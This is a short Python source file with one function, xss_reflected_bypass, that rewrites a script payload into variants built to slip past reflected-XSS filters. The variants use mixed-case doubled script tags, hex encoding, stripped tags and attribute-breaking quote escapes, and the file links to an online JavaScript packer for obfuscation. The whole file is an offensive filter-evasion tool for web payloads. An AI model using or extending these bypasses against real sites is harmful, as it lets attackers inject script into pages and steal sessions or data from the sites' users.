#new file
import codecs
import html
from get_char_code import *

def xss_reflected_bypass(string):
    a = []
    a.append(string.replace("<script>","<<ScRipT>").replace("</script>","//<</sCrIPt>"))
    hexlify = codecs.getencoder('hex')
    a.append(str(hexlify(string.encode('utf-8'))[0]))
    allof = string.replace("<script>","").replace("</script>","")
    #for x,y in char_codes:
    #    allof = string.replace(x," " + y + " ,")
    a.append(allof)
    a.append("Obfuscate Your Code Here : http://dean.edwards.name/packer/")
    a.append("\">" + string.replace("\"","\\").replace("\'","\\"))
    return a
